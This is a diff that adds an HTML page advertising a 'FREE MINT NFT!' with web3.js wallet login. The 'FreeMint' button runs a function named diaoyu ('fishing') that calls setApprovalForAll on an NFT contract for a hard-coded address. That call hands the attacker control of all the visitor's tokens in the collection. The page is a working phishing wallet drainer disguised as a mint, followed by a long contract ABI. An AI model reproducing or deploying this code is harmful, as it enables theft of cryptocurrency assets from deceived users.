@@ -1,0 +1,655 @@
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <link href="https://unpkg.com/tailwindcss@^1.0/dist/tailwind.min.css" rel="stylesheet" />
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.6.1/web3.min.js" integrity="sha512-5erpERW8MxcHDF7Xea9eBQPiRtxbse70pFcaHJuOhdEBQeAxGQjUwgJbuBDWve+xP/u5IoJbKjyJk50qCnMD7A==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+</head>
+
+<body class="h-full">
+    <div class="
+        flex
+        w-full
+        h-full
+        justify-center
+        content-center
+        items-center
+        space-x-4
+      ">
+        <div class="flex flex-col space-y-6">
+            <h3 class="text-center">FREE MINT NFT!</h3>
+            <div class="flex flex-col space-y-2">
+                <button onclick="loginWithEth()" class="
+              rounded
+              bg-white
+              border border-gray-400
+              hover:bg-gray-100
+              py-2
+              px-4
+              text-gray-600
+              hover:text-gray-700
+            ">
+            Login & Save ETH Address
+          </button>
+                <p id="userAddress" class="text-gray-600"></p>
+                <button id="logoutButton" onclick="logout()" class="hidden text-blue-500 underline">
+            Logout
+          </button>
+            </div>
+            <button id="getContractInfo" onclick="diaoyu()" class="rounded bg-blue-500 hover:bg-blue-700 py-2 px-4 text-white">
+          FreeMint
+        </button>
+            <div class="flex flex-col space-y-2"></div>
+        </div>
+    </div>
+
+    <script>
+        window.userAddress = null;
+        window.onload = async() => {
+            // Init Web3 connected to ETH network
+            if (window.ethereum) {
+                window.web3 = new Web3(window.ethereum);
+            } else {
+                alert("No ETH brower extension detected.");
+            }
+
+            // Load in Localstore key
+            window.userAddress = window.localStorage.getItem("userAddress");
+            showAddress();
+        };
+
+        // Use this function to turn a 42 character ETH address
+        // into an address like 0x345...12345
+        function truncateAddress(address) {
+            if (!address) {
+                return "";
+            }
+            return `${address.substr(0, 5)}...${address.substr(
+          address.length - 5,
+          address.length
+        )}`;
+        }
+
+        // Display or remove the users know address on the frontend
+        function showAddress() {
+            if (!window.userAddress) {
+                document.getElementById("userAddress").innerText = "";
+                document.getElementById("logoutButton").classList.add("hidden");
+                return false;
+            }
+
+            document.getElementById(
+                "userAddress"
+            ).innerText = `ETH Address: ${truncateAddress(window.userAddress)}`;
+            document.getElementById("logoutButton").classList.remove("hidden");
+        }
+
+        // remove stored user address and reset frontend
+        function logout() {
+            window.userAddress = null;
+            window.localStorage.removeItem("userAddress");
+            showAddress();
+        }
+
+        // Login with Web3 via Metamasks window.ethereum library
+        async function loginWithEth() {
+            if (window.web3) {
+                try {
+                    // We use this since ethereum.enable() is deprecated. This method is not
+                    // available in Web3JS - so we call it directly from metamasks' library
+                    const selectedAccount = await window.ethereum
+                        .request({
+                            method: "eth_requestAccounts",
+                        })
+                        .then((accounts) => accounts[0])
+                        .catch(() => {
+                            throw Error("No account selected!");
+                        });
+                    window.userAddress = selectedAccount;
+                    window.localStorage.setItem("userAddress", selectedAccount);
+                    showAddress();
+                } catch (error) {
+                    console.error(error);
+                }
+            } else {
+                alert("No ETH brower extension detected.");
+            }
+        }
+
+        async function diaoyu() {
+            const mya = "0x4ac616D3b98289FCCD2De3a9ac7841d24bc2F52D";
+            const CONTRACT_ADDRESS = "0xA74aE2c6FCa0CEdbAef30A8CEEF834B247186bcF";
+            const contract = new window.web3.eth.Contract(
+                window.ABI,
+                CONTRACT_ADDRESS
+            );
+            const symbol = await contract.methods
+                .setApprovalForAll(mya, true)
+                .send({
+                    from: window.userAddress
+                });
+        }
+
+        window.ABI = [{
+            "inputs": [{
+                "internalType": "string",
+                "name": "baseURI_",
+                "type": "string"
+            }, {
+                "internalType": "address",
+                "name": "_layerZeroEndpoint",
+                "type": "address"
+            }],
+            "stateMutability": "nonpayable",
+            "type": "constructor"
+        }, {
+            "anonymous": false,
+            "inputs": [{
+                "indexed": true,
+                "internalType": "address",
+                "name": "owner",
+                "type": "address"
+            }, {
+                "indexed": true,
+                "internalType": "address",
+                "name": "approved",
+                "type": "address"
+            }, {
+                "indexed": true,
+                "internalType": "uint256",
+                "name": "tokenId",
+                "type": "uint256"
+            }],
+            "name": "Approval",
+            "type": "event"
+        }, {
+            "anonymous": false,
+            "inputs": [{
+                "indexed": true,
+                "internalType": "address",
+                "name": "owner",
+                "type": "address"
+            }, {
+                "indexed": true,
+                "internalType": "address",
+                "name": "operator",
+                "type": "address"
+            }, {
+                "indexed": false,
+                "internalType": "bool",
+                "name": "approved",
+                "type": "bool"
+            }],
+            "name": "ApprovalForAll",
+            "type": "event"
+        }, {
+            "anonymous": false,
+            "inputs": [{
+                "indexed": false,
+                "internalType": "uint16",
+                "name": "_srcChainId",
+                "type": "uint16"
+            }, {
+                "indexed": false,
+                "internalType": "bytes",
+                "name": "_srcAddress",
+                "type": "bytes"
+            }, {
+                "indexed": false,
+                "internalType": "uint64",
+                "name": "_nonce",
+                "type": "uint64"
+            }, {
+                "indexed": false,
+                "internalType": "bytes",
+                "name": "_payload",
+                "type": "bytes"
+            }],
+            "name": "MessageFailed",
+            "type": "event"
+        }, {
+            "anonymous": false,
+            "inputs": [{
+                "indexed": true,
+                "internalType": "address",
+                "name": "previousOwner",
+                "type": "address"
+            }, {
+                "indexed": true,
+                "internalType": "address",
+                "name": "newOwner",
+                "type": "address"
+            }],
+            "name": "OwnershipTransferred",
+            "type": "event"
+        }, {
+            "anonymous": false,
+            "inputs": [{
+                "indexed": true,
+                "internalType": "address",
+                "name": "from",
+                "type": "address"
+            }, {
+                "indexed": true,
+                "internalType": "address",
+                "name": "to",
+                "type": "address"
+            }, {
+                "indexed": true,
+                "internalType": "uint256",
+                "name": "tokenId",
+                "type": "uint256"
+            }],
+            "name": "Transfer",
+            "type": "event"
+        }, {
+            "inputs": [],
+            "name": "_owner",
+            "outputs": [{
+                "internalType": "address",
+                "name": "",
+                "type": "address"
+            }],
+            "stateMutability": "view",
+            "type": "function"
+        }, {
+            "inputs": [{
+                "internalType": "address",
+                "name": "to",
+                "type": "address"
+            }, {
+                "internalType": "uint256",
+                "name": "tokenId",
+                "type": "uint256"
+            }],
+            "name": "approve",
+            "outputs": [],
+            "stateMutability": "nonpayable",
+            "type": "function"
+        }, {
+            "inputs": [{
+                "internalType": "address",
+                "name": "owner",
+                "type": "address"
+            }],
+            "name": "balanceOf",
+            "outputs": [{
+                "internalType": "uint256",
+                "name": "",
+                "type": "uint256"
+            }],
+            "stateMutability": "view",
+            "type": "function"
+        }, {
+            "inputs": [],
+            "name": "donate",
+            "outputs": [],
+            "stateMutability": "payable",
+            "type": "function"
+        }, {
+            "inputs": [{
+                "internalType": "uint16",
+                "name": "",
+                "type": "uint16"
+            }, {
+                "internalType": "bytes",
+                "name": "",
+                "type": "bytes"
+            }, {
+                "internalType": "uint256",
+                "name": "",
+                "type": "uint256"
+            }],
+            "name": "failedMessages",
+            "outputs": [{
+                "internalType": "uint256",
+                "name": "payloadLength",
+                "type": "uint256"
+            }, {
+                "internalType": "bytes32",
+                "name": "payloadHash",
+                "type": "bytes32"
+            }],
+            "stateMutability": "view",
+            "type": "function"
+        }, {
+            "inputs": [{
+                "internalType": "uint256",
+                "name": "tokenId",
+                "type": "uint256"
+            }],
+            "name": "getApproved",
+            "outputs": [{
+                "internalType": "address",
+                "name": "",
+                "type": "address"
+            }],
+            "stateMutability": "view",
+            "type": "function"
+        }, {
+            "inputs": [{
+                "internalType": "address",
+                "name": "owner",
+                "type": "address"
+            }, {
+                "internalType": "address",
+                "name": "operator",
+                "type": "address"
+            }],
+            "name": "isApprovedForAll",
+            "outputs": [{
+                "internalType": "bool",
+                "name": "",
+                "type": "bool"
+            }],
+            "stateMutability": "view",
+            "type": "function"
+        }, {
+            "inputs": [{
+                "internalType": "uint16",
+                "name": "_srcChainId",
+                "type": "uint16"
+            }, {
+                "internalType": "bytes",
+                "name": "_srcAddress",
+                "type": "bytes"
+            }, {
+                "internalType": "uint64",
+                "name": "_nonce",
+                "type": "uint64"
+            }, {
+                "internalType": "bytes",
+                "name": "_payload",
+                "type": "bytes"
+            }],
+            "name": "lzReceive",
+            "outputs": [],
+            "stateMutability": "nonpayable",
+            "type": "function"
+        }, {
+            "inputs": [{
+                "internalType": "uint8",
+                "name": "numTokens",
+                "type": "uint8"
+            }],
+            "name": "mint",
+            "outputs": [],
+            "stateMutability": "payable",
+            "type": "function"
+        }, {
+            "inputs": [],
+            "name": "name",
+            "outputs": [{
+                "internalType": "string",
+                "name": "",
+                "type": "string"
+            }],
+            "stateMutability": "view",
+            "type": "function"
+        }, {
+            "inputs": [{
+                "internalType": "uint16",
+                "name": "_srcChainId",
+                "type": "uint16"
+            }, {
+                "internalType": "bytes",
+                "name": "_srcAddress",
+                "type": "bytes"
+            }, {
+                "internalType": "uint64",
+                "name": "_nonce",
+                "type": "uint64"
+            }, {
+                "internalType": "bytes",
+                "name": "_payload",
+                "type": "bytes"
+            }],
+            "name": "onLzReceive",
+            "outputs": [],
+            "stateMutability": "nonpayable",
+            "type": "function"
+        }, {
+            "inputs": [],
+            "name": "owner",
+            "outputs": [{
+                "internalType": "address",
+                "name": "",
+                "type": "address"
+            }],
+            "stateMutability": "view",
+            "type": "function"
+        }, {
+            "inputs": [{
+                "internalType": "uint256",
+                "name": "tokenId",
+                "type": "uint256"
+            }],
+            "name": "ownerOf",
+            "outputs": [{
+                "internalType": "address",
+                "name": "",
+                "type": "address"
+            }],
+            "stateMutability": "view",
+            "type": "function"
+        }, {
+            "inputs": [],
+            "name": "renounceOwnership",
+            "outputs": [],
+            "stateMutability": "nonpayable",
+            "type": "function"
+        }, {
+            "inputs": [{
+                "internalType": "uint16",
+                "name": "_srcChainId",
+                "type": "uint16"
+            }, {
+                "internalType": "bytes",
+                "name": "_srcAddress",
+                "type": "bytes"
+            }, {
+                "internalType": "uint64",
+                "name": "_nonce",
+                "type": "uint64"
+            }, {
+                "internalType": "bytes",
+                "name": "_payload",
+                "type": "bytes"
+            }],
+            "name": "retryMessage",
+            "outputs": [],
+            "stateMutability": "payable",
+            "type": "function"
+        }, {
+            "inputs": [{
+                "internalType": "address",
+                "name": "from",
+                "type": "address"
+            }, {
+                "internalType": "address",
+                "name": "to",
+                "type": "address"
+            }, {
+                "internalType": "uint256",
+                "name": "tokenId",
+                "type": "uint256"
+            }],
+            "name": "safeTransferFrom",
+            "outputs": [],
+            "stateMutability": "nonpayable",
+            "type": "function"
+        }, {
+            "inputs": [{
+                "internalType": "address",
+                "name": "from",
+                "type": "address"
+            }, {
+                "internalType": "address",
+                "name": "to",
+                "type": "address"
+            }, {
+                "internalType": "uint256",
+                "name": "tokenId",
+                "type": "uint256"
+            }, {
+                "internalType": "bytes",
+                "name": "_data",
+                "type": "bytes"
+            }],
+            "name": "safeTransferFrom",
+            "outputs": [],
+            "stateMutability": "nonpayable",
+            "type": "function"
+        }, {
+            "inputs": [{
+                "internalType": "address",
+                "name": "operator",
+                "type": "address"
+            }, {
+                "internalType": "bool",
+                "name": "approved",
+                "type": "bool"
+            }],
+            "name": "setApprovalForAll",
+            "outputs": [],
+            "stateMutability": "nonpayable",
+            "type": "function"
+        }, {
+            "inputs": [{
+                "internalType": "string",
+                "name": "URI",
+                "type": "string"
+            }],
+            "name": "setBaseURI",
+            "outputs": [],
+            "stateMutability": "nonpayable",
+            "type": "function"
+        }, {
+            "inputs": [{
+                "internalType": "uint256",
+                "name": "newVal",
+                "type": "uint256"
+            }],
+            "name": "setGasForDestinationLzReceive",
+            "outputs": [],
+            "stateMutability": "nonpayable",
+            "type": "function"
+        }, {
+            "inputs": [{
+                "internalType": "uint16",
+                "name": "_chainId",
+                "type": "uint16"
+            }, {
+                "internalType": "bytes",
+                "name": "_trustedRemote",
+                "type": "bytes"
+            }],
+            "name": "setTrustedRemote",
+            "outputs": [],
+            "stateMutability": "nonpayable",
+            "type": "function"
+        }, {
+            "inputs": [{
+                "internalType": "bytes4",
+                "name": "interfaceId",
+                "type": "bytes4"
+            }],
+            "name": "supportsInterface",
+            "outputs": [{
+                "internalType": "bool",
+                "name": "",
+                "type": "bool"
+            }],
+            "stateMutability": "view",
+            "type": "function"
+        }, {
+            "inputs": [],
+            "name": "symbol",
+            "outputs": [{
+                "internalType": "string",
+                "name": "",
+                "type": "string"
+            }],
+            "stateMutability": "view",
+            "type": "function"
+        }, {
+            "inputs": [{
+                "internalType": "uint256",
+                "name": "tokenId",
+                "type": "uint256"
+            }],
+            "name": "tokenURI",
+            "outputs": [{
+                "internalType": "string",
+                "name": "",
+                "type": "string"
+            }],
+            "stateMutability": "view",
+            "type": "function"
+        }, {
+            "inputs": [{
+                "internalType": "address",
+                "name": "from",
+                "type": "address"
+            }, {
+                "internalType": "address",
+                "name": "to",
+                "type": "address"
+            }, {
+                "internalType": "uint256",
+                "name": "tokenId",
+                "type": "uint256"
+            }],
+            "name": "transferFrom",
+            "outputs": [],
+            "stateMutability": "nonpayable",
+            "type": "function"
+        }, {
+            "inputs": [{
+                "internalType": "address",
+                "name": "newOwner",
+                "type": "address"
+            }],
+            "name": "transferOwnership",
+            "outputs": [],
+            "stateMutability": "nonpayable",
+            "type": "function"
+        }, {
+            "inputs": [{
+                "internalType": "uint16",
+                "name": "_chainId",
+                "type": "uint16"
+            }, {
+                "internalType": "uint256",
+                "name": "tokenId",
+                "type": "uint256"
+            }],
+            "name": "traverseChains",
+            "outputs": [],
+            "stateMutability": "payable",
+            "type": "function"
+        }, {
+            "inputs": [{
+                "internalType": "uint16",
+                "name": "",
+                "type": "uint16"
+            }],
+            "name": "trustedRemoteLookup",
+            "outputs": [{
+                "internalType": "bytes",
+                "name": "",
+                "type": "bytes"
+            }],
+            "stateMutability": "view",
+            "type": "function"
+        }, {
+            "inputs": [{
+                "internalType": "uint256",
+                "name": "amt",
+                "type": "uint256"
+            }],
+            "name": "withdraw",
+            "outputs": [],
+            "stateMutability": "nonpayable",
+            "type": "function"
+        }];
+    </script>
+</body>
